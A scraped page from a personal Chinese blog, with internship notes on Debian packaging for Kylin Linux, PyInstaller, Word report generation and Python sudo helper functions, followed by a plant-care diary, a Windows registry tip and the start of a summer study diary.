                    <button class="btn" onclick="activeTag('CSV');">CSV</button>
                    
                    <button class="btn" onclick="activeTag('HTML');">HTML</button>
                    
                    <button class="btn" onclick="activeTag('lxml');">lxml</button>
                    
                    <button class="btn" onclick="activeTag('OLE');">OLE</button>
                    
                    <button class="btn" onclick="activeTag('Python');">Python</button>
                    
                    <button class="btn" onclick="activeTag('Word');">Word</button>
                    
                    <button class="btn" onclick="activeTag('XML');">XML</button>
                    
                    <button class="btn" onclick="activeTag('实现');">实现</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>4/26/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>麒麟实训期间的技术积累。</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240730234421.webp</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>556f2cfc</span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!notice] 文章重组提示 [2024.07.30]<br>
本文将以下文章进行聚合：</p>
<ul>
<li>【麒麟实训】Deb 的打包（小练习分享）</li>
<li>【麒麟实训】撷英 1 - Pyqt 程序编译与打包探索</li>
<li>【麒麟实训】撷英 2 - Python 代码控制 word 文档模板</li>
<li>【麒麟实训】撷英3 - Python执行Linux命令公共方法</li>
</ul>
</blockquote>
<h1>【麒麟实训】Deb 的打包（小练习分享）</h1>
<p>练习 Deb 的打包流程。<strong>本文章为一次小练习的记录，操作过程多少有瑕疵，可能不适合实践参考。</strong>“实训撷英”专栏将有更专门的打包介绍。</p>
<p>文章部分内容来源于我的实训工作文档：<strong>《练习 1 过程文档（改进）》、《练习 2 过程文档（改进）》</strong>。规范的打包过程请参考《麒麟软件打包规范》。</p>
<h2>Deb 的二进制文件打包</h2>
<p>创建 DEBIAN 文件夹、etc、opt、usr 文件夹。</p>
<p>目录格式：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-64.png" alt=""></p>
<p>在 DEBIAN 文件夹下创建 control 文件：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-65.png" alt=""></p>
<blockquote>
<p>企业老师给出的意见：</p>
<p><strong>control 文件中包含空的关键字，应该删除，如 section 无对应信息则不存在。</strong></p>
</blockquote>
<p>最终的目录结构：</p>
<pre><code class="language-tree">.
├── DEBIAN
│   └── control
├── etc
├── opt
│   └── sublime-text
│       ├── changelog.txt
│       ├── crash_reporter
│       ├── Lib
│       ├── libcrypto.so.1.1
│       ├── libssl.so.1.1
│       ├── Packages
│       ├── plugin_host-3.3
│       ├── plugin_host-3.8
|       ├── Icon 
│       └── sublime_text
└── usr
    └── share
        └── applications
        │   └── sublime_text.desktop
        └──icons
        └── hicolor
        	├──128x128
            │   └── apps
            │   └── sublime-text.png
            └──256x256
            ... ...
</code></pre>
<p>打包：</p>
<pre><code>sudo dpkg -b project project_v1.0.0_amd64.deb
</code></pre>
<p>安装：</p>
<pre><code>sudo dpkg -i project_v1.0.0_amd64.deb
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-66.png" alt=""></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/3419d8f19c789d4a0df5853d710f223.png" alt=""></p>
<p>新程序</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220427112054890.png" alt=""></p>
<p>运行效果</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-69.png" alt=""></p>
<p>卸载：</p>
<pre><code class="language-bash">sudo dpkg -r project

# 干净卸载：
sudo dpkg -P sublime-text
</code></pre>
<p>参考：<a href="https://blog.csdn.net/LvJzzZ/article/details/109452895">deb打包流程步骤_逐渐江江江江化的博客-CSDN博客_deb打包</a></p>
<h2>问题解决</h2>
<h3>开始菜单图标显示不出来的问题</h3>
<p>请注意：图标目录<strong>Icons</strong>的名称和位置进行正确的设置、以及放置。参看上文给的目录树。</p>
<p>比如正确的放置方法时：icons/hicolor/128x128/下，还需要建立 apps 文件夹，里面放置 png 图标。</p>
<h3>打包报错：软件包名字错误</h3>
<p>注意，“Package”字段的内容，用“-”（减号）不用“_&quot;（下划线）哦，否则会报以下错误：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/b1019d44efa1006555b419258d254b2.png" alt=""></p>
<p>借 shibo 同学的图</p>
<h3>打包报错：与本机架构不符</h3>
<pre><code>sudo dpkg --add-architecture amd64
</code></pre>
<p>参考：<a href="https://blog.csdn.net/qiuchangyong/article/details/97505379">Ubuntu使用dpkg查看与修改architecture的用法_qiuchangyong的博客-CSDN博客</a></p>
<h2>Deb 源码打包</h2>
<p>下载源码压缩包，解压。</p>
<pre><code>tar zxvf p7zip.tar.gz
</code></pre>
<p>将解压后的文件移动到构造好的目录中，得到以下目录结构：</p>
<pre><code>.
├── opt
│   └── apps
│       └── p7zip
│           ├── Asm
│           │   └── x86
│           ├── C
│           ├── check
│           ├── contrib
│           ├── CPP
│           ├── DOC
│           ├── GUI
│           ├── man1
│           └── Utils     // 不应该存放源码
└── usr
    └── share
        ├── applications
        └── icons
            └── hicolor
</code></pre>
<blockquote>
<p>企业老师给出的意见：</p>
<p>_ 不应该 _ 将源码文件全部存放到/opt/apps/p7zip 目录下（因为是二进制软件包，不应该将源码存放到对应目录下）；不应该有空目录/usr/share/icons/hicolor</p>
</blockquote>
<p>在/p7zip-16.02 目录下执行指令：</p>
<pre><code>dh_make --createorig -s
</code></pre>
<p>生成 debian 文件夹。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220506102802357.png" alt="image-20220506102802357"></p>
<p>修改 debian/control</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220506104427558.png" alt="image-20220506104427558"></p>
<p>在 rules 中添加 Override：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220506104934917.png" alt="image-20220506104934917"></p>
<p>在 debian 下创建 install 文件，并写入以下内容：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220506110213565.png" alt="image-20220506110213565"></p>
<p>执行 debuild 命令：</p>
<pre><code class="language-bash">debuild -i -us -uc -b

# 生成过程需要补充安装以下软件（Build-Depends）
sudo apt-get install debhelper
</code></pre>
<p>这时，在源码文件的上一级目录会多出几个文件，其中就包括 deb 包：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220506110901935.png" alt="image-20220506110901935"></p>
<p>执行安装：</p>
<pre><code>sudo dpkg -i p7zip_16.02_all.deb
</code></pre>
<p>查看安装效果：</p>
<pre><code>sudo dpkg -l p7zip
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220506111049159.png" alt="image-20220428215252343"></p>
<p>可以正常卸载：</p>
<pre><code>sudo dpkg -P p7zip
</code></pre>
<p>卸载后查找不到 p7zip。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220506111234325.png" alt="image-20220506111234325"></p>
<h2>Deb 源码打包（野生方法）</h2>
<p>从网上找来的自己摸索的方法。可能不符合麒麟软件的打包规范。这是初次练习的成果。</p>
<p>安装需要的工具：</p>
<pre><code>sudo apt-get install debmake
sudo apt-get install python3-debia
sudo apt-get install build-essential
</code></pre>
<p>生成 debian 文件夹配置文件：</p>
<pre><code>debmake -e unknow@unknow.cn -p p7zip -u 16.02 -f &quot;unknow unknow&quot; -n
</code></pre>
<p>命令解释：</p>
<ul>
<li>邮件地址 <a href="mailto:unknow@unknow.cn">unknow@unknow.cn</a></li>
<li>软件包名 p7zip</li>
<li>软件版本号 16.02</li>
<li>作者全名 unknow unknow</li>
</ul>
<p>命令执行后，会多出 debian 文件夹：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220427123914.png" alt="QQ截图20220427123914"></p>
<p>编辑 debian/control</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220427235600.png" alt="QQ截图20220427235600"></p>
<p>生成 deb 包：</p>
<pre><code>sudo dpkg-buildpackage -us -uc -tc

# 生成过程需要补充安装以下软件（Build-Depends）
sudo apt-get install debhelper
</code></pre>
<p>这是，在源码文件的上一级目录会多出几个文件，其中就包括 deb 包：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220427230246.png" alt="QQ截图20220427230246"></p>
<p>执行安装：</p>
<pre><code>sudo dpkg -i p7zip_16.02_amd64.deb
</code></pre>
<p>查看安装效果：</p>
<pre><code>sudo dpkg -l p7zip
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/QQ%E6%88%AA%E5%9B%BE20220427235449.png" alt="QQ截图20220427235449"></p>
<p>参考：<a href="https://www.csdn.net/tags/NtjaEg0sNjY5NDMtYmxvZwO0O0OO0O0O.html">debmake - CSDN</a></p>
<h2>其他</h2>
<h3>虚拟机 Kylin 系统的安装</h3>
<p>请参看：<a href="https://www.jianshu.com/p/24a52d78d5a6">使用VirtualBox安装Kylin桌面版操作系统 - 简书 (jianshu.com)</a></p>
<p>屏幕调大的命令：</p>
<pre><code>xrandr -s 1920x1200_60 # 在麒麟终端输入
</code></pre>
<p>自己多试一下：</p>
<blockquote>
<p>[!Error]<br>
原文此位置包含图片，现链接已被覆盖造成丢失，且复查时存在疏漏。原图片命名为：image-70.png</p>
</blockquote>
<p>或者在麒麟桌面设置那里调，一劳永逸。</p>
<h3>tree 命令</h3>
<p>安装：</p>
<pre><code>$ sudo apt-get install tree
</code></pre>
<p>使用：</p>
<pre><code>$ tree
$ tree -d # 仅列出目录
</code></pre>
<p>参考：<a href="https://blog.csdn.net/weixin_31445091/article/details/116543595">linux tree命令,Linux tree命令实例详解_章鱼老师的博客-CSDN博客</a></p>
<h1>【麒麟实训】撷英 1 - Pyqt 程序编译与打包探索</h1>
<p>本篇文章内容仅供简略参考。</p>
<p>文章内容来源于我的<strong>飞书文档&gt;麒麟实训&gt;大作业 - 编译与打包</strong>，更多问题的详细记录、示例文件以及调研文档请参看源文档。</p>
<h2>Python 源码编译</h2>
<p>python 编译</p>
<p>安装 pyinstaller:</p>
<pre><code class="language-sh">pip install https://github.com/pyinstaller/pyinstaller/tarball/develop
</code></pre>
<p>只需对入口文件执行命令：</p>
<pre><code class="language-sh"># 两种打包方式
pyinstaller -F run.py # 打包成一个二进制文件，但启动速度慢
pyinstaller -D run.py # 打包出多个文件，程序启动速度快
</code></pre>
<p>参考：</p>
<p><a href="http://c.biancheng.net/view/2690.html">Python PyInstaller安装和使用教程（详解版） (biancheng.net)</a></p>
<p><a href="https://blog.csdn.net/qq_38316721/article/details/122599987">PyQt5软件打包_王火火的博客-CSDN博客_pyqt打包</a></p>
<h2>Pyqt 窗口图标</h2>
<p>关于应用程序窗口图标显示问题可参考：<a href="http://t.zoukankan.com/jingsupo-p-13536449.html">http://t.zoukankan.com/jingsupo-p-13536449.html</a></p>
<p>加代码的地方：在 ui <a href="http://xn--vnu486bqgs.py">转成的.py</a> 文件</p>
<pre><code class="language-python">self.setWindowIcon(QIcon(':/signal-slot-demo.ico'))
</code></pre>
<p>打包后，编译生成的二进制文件的同级目录需要放上图标。</p>
<h2>打包过程总览</h2>
<ol>
<li>按照《麒麟软件打包规范》构造 deb 包目录</li>
<li>打开源码项目执行 <code>pyinstaller -D run.py -n signal-slot-demo</code></li>
<li>在 pyinstaller 中生成的 signal-slot-demo 文件夹中添加 icon 图标。并将该文件夹放入构造好的 deb 包目录下的/opt/apps/中</li>
</ol>
<p><img src="https://typora-1301301520.cos.ap-nanjing.myqcloud.com/img/asynccode" alt="img"></p>
<ol start="4">
<li>进入构造好的目录，执行命令：<code>debuild -i -us -uc -b</code></li>
<li>返回上一级目录执行：<code>sudo dpkg -i signal-slot-demo_1.0.0-1_all.deb</code></li>
</ol>
<p>结果：运行正常。窗口图标、任务栏图标、开始菜单栏图标运行正常。（开始菜单栏中的图标是.desktop 文件中 Icon 指定的 svg 图标。程序窗口以及任务栏图标是 Pyqt 中代码指定的图标。）</p>
<h2>具体文件示例</h2>
<p>Control 文件</p>
<pre><code>Source: signal-slot-demo
Version: 1.0.0
Maintainer: Wu WanQin &lt;wuanqin@tju.edu.cn&gt;
Section: unknown
Priority: optional
Build-Depends: debhelper
Standards-Version: 4.4.1
Homepage: https://uuanqin.top

Package:signal-slot-demo
Multi-Arch: foreign
Architecture: all
Depends: ${shlibs:Depends}, ${misc:Depends}
Description: 信号与信号槽示例。
</code></pre>
<p>Install 文件</p>
<pre><code>opt/apps/signal-slot-demo/ /opt/apps
usr/share /usr/
</code></pre>
<p>.desktop 文件</p>
<pre><code class="language-desktop">[Desktop Entry]
Name=Signal-Slot-Demo
Comment=An example
Exec=/opt/apps/signal-slot-demo/signal-slot-demo %F
Icon=/usr/share/icons/scalable/apps/signal-slot-demo.svg
Terminal=false
Type=Application
X-Ubuntu-Touch=true
Categories=Office
</code></pre>
<h1>【麒麟实训】撷英 2 - Python 代码控制 word 文档模板</h1>
<p>通过 python 是可以控制 word 文档内容的，本篇文章简要介绍其原理，具体实现与实际案例可看我的开源项目。详细文档可查看我的<strong>飞书文档&gt;麒麟实训&gt;大作业 - 文档生成工具</strong>。</p>
<h2>简介</h2>
<p>文档生成工具主要通过对自动化适配工具生成的 csv 报告、html 报告进行读取、解析、整理，进而生成指定的 word 总报告。</p>
<p>项目地址：<a href="https://gitee.com/uuanqin/report_generator.git">https://gitee.com/uuanqin/report_generator.git</a></p>
<h2>基本原理</h2>
<p>每一个 word 文档都可以通过 xml 表示，这个 xml 中包含文字信息和格式信息。通过给定的 doc 报告模板，我们可以以 xml 的方式进行操作，在实现增删改查 xml 元素的同时保持原有给定的格式基本不变。</p>
<h2>业务流程</h2>
<p>伪代码：</p>
<ul>
<li>获取所有生成最终报告需要的源报告路径</li>
<li>根据路径对文件及文件夹进行读取</li>
<li>对每个文件中的数据提取、解析、整理</li>
<li>读取报告模板，填写每个部分的 word 表格</li>
<li>“FAIL&quot;,&quot;PASS&quot; 字体染色</li>
<li>保存为中间文件 <em>temp.xml</em></li>
<li>读取 <em>temp.xml</em>，替换其中的变量，保存为中间文件 <em>麒麟操作系统适配认证自动化测试报告.xml</em></li>
<li>移动 <em>麒麟操作系统适配认证自动化测试报告.xml</em> 到目标文件夹中，修改后缀为.doc</li>
</ul>
<h2>效果示例</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220701160509387.png" alt="image-20220701160509387"></p>
<h2>文档对象插入</h2>
<p>关于 python 控制 word 中的文档对象可查看以下方法：</p>
<p><a href="https://blog.csdn.net/u011420268/article/details/106402153/">python在word文档里插入文件对象_奶爸大山的博客-CSDN博客_python word附件</a></p>
<p>经我与导师们实际调研与操作得到以下结论：</p>
<ul>
<li>需要事先在 word 插入好文档对象，我们才可能通过代码改变这个文档对象。</li>
<li>python 代码中只能改变文档对象指向的内容，新增加文档对象。</li>
<li>支持改变的文档对象只能是 xlsx 格式或 docx 格式，其他格式的文档对象插入时，生成的 ole.bin 文件暂时没找到办法进行生成。</li>
</ul>
<h1>【麒麟实训】撷英3 - Python执行Linux命令公共方法</h1>
<p>废话不说，show you my code，自己看。</p>
<p>这些公共方法可以直接用于<strong>执行sudo指令、验证用户密码、以及执行普通命令</strong>。</p>
<pre><code class="language-python">def sudo_verify(password:str):
    &quot;&quot;&quot;
    在使用sudo命令之前最好调用一次该程序验证sudo密码的正确性。
    :param password: 需要验证的密码
    :return: 布尔类型 表示通过与否，字符串类型表示返回信息。（密码正确时返回空串）
    &quot;&quot;&quot;
    test_str = 'sudo test'

    echo = subprocess.Popen(['echo', password], stdout=subprocess.PIPE, )

    sudo = subprocess.Popen(['sudo', '-S', 'echo', test_str],
                            stdin=echo.stdout,
                            stdout=subprocess.PIPE,
                            # stderr=subprocess.PIPE
                            )

    return_str = sudo.stdout.read().decode().replace(&quot;\n&quot;,&quot;&quot;)
    if return_str == test_str:
        return True,&quot;&quot;
    else:
        return False,return_str.replace(&quot;\n&quot;,&quot;&quot;)

def sudo_do_something(password:str,command:list):
    &quot;&quot;&quot;
    调用此方法以执行需要加sudo的命令。
    :param password: 密码
    :param command: 列表,如：['./run.sh', test_type, debpkg]
    :return:
    &quot;&quot;&quot;
    is_pass,rtstring=sudo_verify(password)
    if is_pass:
        echo = subprocess.Popen(['echo', password], stdout=subprocess.PIPE, )
        sudo = subprocess.Popen(['sudo', '-S'] + command,
                                stdin=echo.stdout,
                                stdout=subprocess.PIPE,
                                # stderr=subprocess.PIPE
                                )

        rtstring = sudo.stdout.read().decode()
    return is_pass,rtstring

def command(command):
    p = subprocess.Popen(command,
                            # stdin=echo.stdout,
                            stdout=subprocess.PIPE,
                            # stderr=subprocess.PIPE
                            )

    rtstring = p.stdout.read().decode()
    return rtstring
</code></pre>


                
            </main>

            <footer class="list-content-container">
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">1</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="1973703782">
                            <a href="#1973703782">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_百味人生);">⬤</span>
                                    
                                    <span style="color: var(--n_有感而发);">⬤</span>
                                    
                                </span>
                                
                                <span>【麒麟实训】开始与结束</span>
                                
                                <div class="record-links-context hover">
                                    <p><a href="#1433349372" title="【麒麟实训】撷英分享" class="record-link highlight">【麒麟实训】撷英分享</a></p>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="4028728107" class="record">
            <header>
                <h1 class="record-title">绿萝养殖日记</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 有感而发</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('绿植养护');">绿植养护</button>
                    
                    <button class="btn" onclick="activeTag('TJU');">TJU</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/13/2022</span>
                </div>
                

                

                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>f021832b</span>
                </div>
                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20231022173853.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>养着玩的，有时上心、有时又不上心</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!hint] 阅读提示<br>
本篇文章背景为学校学部组织的学部活动，征集植树节期间获得绿苗奖品的同学写的绿苗养护日记。文章的主要内容于 2022 年 5 月 13 日完成，并于 2023 年 10 月 6 日发表于博客。搬迁过程中做了格式修改，并增加本提示与末尾「其他信息」章节。原文部分内容曾在学部公众号公开过，因此被选为本站第一批公开的生活类文章之一。</p>
</blockquote>
<h1>领取我的小绿萝 🌿🌿🌿（3 月 22 日）</h1>
<p>领取我的小绿萝，可能是晚到了一点，精挑细选也是都是病怏怏的 😮（室友戏称蔫菜叶）。没事，一个月后肯定能把它养活，<strong>精神状态</strong>保证上升一个层次！</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016130039.webp" alt="image.png"></p>
<h1>遭遇不测 一片又一片的叶子枯黄掉落 🍂🍂</h1>
<p>没几天，那些软弱的叶子开始==发蔫发黄==了。某些叶片开始出现黄边，持续扩大，且出现 <strong>“叶传叶”</strong> 的现象，值得警惕！🚨</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016130103.webp" alt="image.png"></p>
<h1>茂盛一时 🌳</h1>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016130135.webp" alt="image.png"></p>
<h1>护苗行动 🍀</h1>
<p>😥 下面四张图片记录了最大一片叶子的枯萎过程 🌱🌿🌳🍃🍂：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016130156.webp" alt="image.png"></p>
<p>再这样下去我的小绿萝<strong>s 了</strong>咋办 😣！从今天开始，执行护苗措施。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016130222.webp" alt="image.png"></p>
<h1>重获新生 向上生长 🌲</h1>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016130236.webp" alt="image.png"></p>
<p><strong>展开了！</strong> 它不断地<strong>展开了！</strong> 🙂🙂</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/c311d6ae-3f4d-4046-897c-d7bbb82c5e40.webp" alt="c311d6ae-3f4d-4046-897c-d7bbb82c5e40.jpg|156"></p>
<p>改善之后的花盆好看了许多！新的叶子开始不断展开，向上生长。</p>
<p>至此，绿萝步入了<strong>新时代</strong>！</p>
<h1>成果展示！🌷（5 月 13 日）</h1>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231016130251.webp" alt="image.png"><br>
今日的阶段成果展示！新叶子越长越高，黄叶片也不在出现。黄叶 <strong>“动态清零”</strong> 的措施生效了！在我精心照顾下，绿萝将有一个光明美好的未来 😜！</p>
<h1>小结</h1>
<p>通过这次的养活绿植活动，我收获了许多养护植物的知识，观察到我曾经没有发现的养护注意点。除此之外，我也收获了一个“绿色”伴侣，在百忙的学习和工作中观察 ta，呵护 ta 也是释放压力的好方式。</p>
<h1>其他信息</h1>
<p>相关链接：</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s/_1N7iWjDRYU-NGkwdfBUoQ">&quot;绿植养护日记&quot;评选及分享（上） (qq.com)</a></li>
<li><a href="https://mp.weixin.qq.com/s/vihO9BZXKanakAPovsLYVg">&quot;绿植养护日记&quot;评选及分享（中） (qq.com)</a></li>
</ul>
<p>绿苗后续：</p>
<ul>
<li>当年年底，由于绿苗放置于室外并疏于照顾导致冻死。</li>
<li>次年 6 月，毕业季原盆栽一起丢弃。</li>
</ul>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="233589647" class="record">
            <header>
                <h1 class="record-title">设备管理器网卡属性没有电源管理选项卡的解决方法</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('WOL');">WOL</button>
                    
                    <button class="btn" onclick="activeTag('注册表');">注册表</button>
                    
                    <button class="btn" onclick="activeTag('网卡');">网卡</button>
                    
                    <button class="btn" onclick="activeTag('设备管理器');">设备管理器</button>
                    
                    <button class="btn" onclick="activeTag('问题解决');">问题解决</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>7/1/2022</span>
                </div>
                

                

                
                <div class="record-description">
                    <span>description :</span>
                    <span>通过修改注册表的方式显示网卡的“电源管理”选项卡。</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>dec4b8f</span>
                </div>
                
            </header>

            <main class="record-content">
                <p>在设置网卡属性时，有时候（比如在设置WOL时）需要在“电源管理”选项卡中进行相应设置。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220627115459612.png" alt="image-20220627115459612"></p>
<p>但在某些情况下并没有这个选项卡。这里提供一个修改注册表的方法。</p>
<p><strong>注意：修改注册表有风险，容易引起系统的不稳定，建议在修改前备份注册表！！</strong></p>
<p>打开注册表编辑器，在对应位置增加字段：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220627120834579.png" alt="image-20220627120834579"></p>
<p>关机重启电脑即可。</p>
<h1>疑似副作用</h1>
<p>关机按钮没有睡眠这一项。轻按键盘关机键原本是直接睡眠，不关电脑。现在直接关电脑，但重启时仍保持关闭时的布局。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/image-20220627121017453.png" alt="image-20220627121017453"></p>
<p>参考链接：<a href="https://answers.microsoft.com/en-us/windows/forum/all/power-management-tab-is-missing-in-device-manager/f84fe229-fb66-4aa1-a397-e9ac65f791e5">Power management tab is missing in device manager! - Microsoft Community</a></p>


                
            </main>

            <footer class="list-content-container">
                

                
            </footer>
        </article>
        
        <article id="3567162190" class="record">
            <header>
                <h1 class="record-title">那一年的暑假剪影</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined, 有感而发</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('考研');">考研</button>
                    
                    <button class="btn" onclick="activeTag('暑假');">暑假</button>
                    
                    <button class="btn" onclick="activeTag('计算机');">计算机</button>
                    
                    <button class="btn" onclick="activeTag('TJU');">TJU</button>
                    
                    <button class="btn" onclick="activeTag('USTC');">USTC</button>
                    
                    <button class="btn" onclick="activeTag('文明6');">文明6</button>
                    
                    <button class="btn" onclick="activeTag('Cities Skylines');">Cities Skylines</button>
                    
                    <button class="btn" onclick="activeTag('飞书');">飞书</button>
                    
                    <button class="btn" onclick="activeTag('Xmind');">Xmind</button>
                    
                    <button class="btn" onclick="activeTag('Bilibili');">Bilibili</button>
                    
                    <button class="btn" onclick="activeTag('软件工程');">软件工程</button>
                    
                    <button class="btn" onclick="activeTag('云盘');">云盘</button>
                    
                    <button class="btn" onclick="activeTag('日记');">日记</button>
                    
                    <button class="btn" onclick="activeTag('游戏');">游戏</button>
                    
                    <button class="btn" onclick="activeTag('效率');">效率</button>
                    
                    <button class="btn" onclick="activeTag('碎碎念');">碎碎念</button>
                    
                    <button class="btn" onclick="activeTag('疫情');">疫情</button>
                    
                    <button class="btn" onclick="activeTag('华为');">华为</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>8/7/2022</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20231016002154.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>暑假留校备战考研的一段时光剪影</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>d49e934e</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>[!hint] 导读提示<br>
2022 年暑假，Bilibili 开启文章专栏活动，鼓励 UP 主们写文字专栏瓜分现金，要求全勤打卡 14 天。当时正值暑假，我留校备战考研。由于文字已经公开于网络一段时间，没有审核与隐私顾虑，所以入选为本站公开的第一批生活类文章。</p>
<p>很久很久没有写过这种日记式的文章，回看那年的文字感觉质量还是挺不错的（毕竟在字数、奖赏与公众目光下写成的，这种模式好像我小学生写日记的样子）。这种感觉是打开了一个密封罐，还能呼吸到夏日银杏树的气息。</p>
<p>14 天的文章于 2022 年 8 月 7 日完成，并在 2023 年 10 月 16 日搬迁到博客网站。搬迁过程中主要做了以下调整：增加本导读提示；新起博客文章标题「那一年的暑假剪影」；对格式进行调整；新增脚注以补充更多内容。</p>
</blockquote>
<h1>day1 备战期间平常的一天</h1>
<p>偶然间看见了哔哩哔哩这个活动，看见参与门槛不高，干脆就来玩玩。毕竟在三年大学生活中也是这样，这儿试试、那儿耍耍，虽然奖励不多，但是写写文字照照相，对身心和思维总是有好处的。</p>
<p>哔哩哔哩的这个日更挑战，估计有以下几个目的：</p>
<ol>
<li>鼓励用户发表专栏文章，进行优质的文字创作</li>
<li>培养用户使用专栏的习惯</li>
<li>丰富专栏生态，打造哔哩哔哩卢浮宫</li>
</ol>
<p>当然在这两周里，我会利用这个机会，对生活中的一些事情进行更加细致的思考，丰富自己搭建的思想内容库。</p>
<p>今天距离考研还有 150 天，目前数学科目基本完成了一轮的复习，专业课完成了 1.5 本书的学习。我对自己目前进度的感觉是处于中下水平进度。数学尤其是高等数学，还需要再进一步加深复习。其实，对于每天早上的时间还是可以更加充分的利用的。白天时间需要严格控制刷短视频的时间，晚上需要早睡。必要时在临睡前两个小时，完成中等强度的有氧运动，比如跑步。</p>
<p>今天干的一件非学习相关的事情是解决了思维导图 Xmind 软件多端同步的问题。详细的解决方案也已经发布在自己的网站上 [^Xmind]。</p>
<p>由于某些特殊的原因，家里面要求我斋戒一天。首先明确的一点是，我是一个受教育的唯物主义者，但是我尊重中国的民俗习惯。我对中国的民俗文化非常感兴趣，也有意愿去了解这些古老神秘的事情。在不涉及大是大非问题以及自己和他人的核心利益上，我愿意遵从这种传统习俗。但是实际上，我今天斋戒了，又好像没有斋戒。晚上吃了一碗玉米鱼粉，特意点了素的，后来才意识到，渔粉的汤应该是包含有动物原料做成的。好吧，管他呢 -_-||。</p>
<p>今天也是第一天探索这样每天挤出五百字以上文字时需要谈什么内容，并且文字会公开。想来想去，干脆就写一篇不伦不类的小学生日记吧，写流水账什么的最简单了。</p>
<p>嗯，我看我已经说了五百字了（暴露了），那今天就这样～</p>
<p>[^Xmind]: 应该是这篇文章 <a href="#3437638411" title="本地文件夹的多端同步" class="record-link ">本地文件夹的多端同步</a>，不过现在的文章内容可能有改版和修正。</p>
<h1>day2 我对我所学专业的一点思考</h1>
<p>学了三年的计算机，从一开始的一张白纸，到现在“有点痕迹”的白纸，我对计算机这门专业有自己的思考。就以 408 划分的科目来看，计算机有四大基础板块：</p>
<ul>
<li>数据结构。这是在学一种思维和设计方法。</li>
<li>计算机组成原理。了解底层硬件工作方式。</li>
<li>操作系统。底层软件调度硬件工作方式。</li>
<li>计算机网络。上层基础服务的实现。</li>
</ul>
<p>就我的大学课程而言，还可以总结出以下几个类别：</p>
<ul>
<li>设计与思维：设计模式，面向对象，软件测试，算法</li>
<li>结构管理：数据库，软件体系结构，架构驱动的程序设计</li>
<li>数据处理与表达：图像处理，人工智能</li>
<li>应用：可视化，计算机图形学</li>
<li>开发模式：软件工程</li>
</ul>
<p>关于科研方向主要就是几个方面：</p>
<ul>
<li>把自然物变为数据进行处理与再生表达</li>
<li>对计算机这个工具本身进行组织和优化</li>
